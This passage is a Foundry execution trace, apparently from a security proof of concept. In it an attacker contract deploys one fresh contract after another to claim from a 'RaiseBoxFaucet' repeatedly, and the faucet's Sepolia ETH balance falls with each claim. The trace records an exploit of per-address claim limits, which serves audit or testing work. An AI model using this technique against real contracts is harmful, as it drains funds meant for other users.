    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14098605] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14090947] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 800000000000000000 [8e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x5e35aD3796e6A6952B3b79DA1aEeD037BDfa3713
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 40) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13833563] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13832804] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13796636] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13788978] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 795000000000000000 [7.95e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x2aB36Af6a2a0fAa786B73b2319aEB19207d89de9
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 41) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13531594] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13530835] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13494667] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13487009] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 790000000000000000 [7.9e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x65Ef579FcE6Ea9775EBe256e7110942829F38Ab1
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 42) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13229625] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13228866] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13192698] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13185040] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
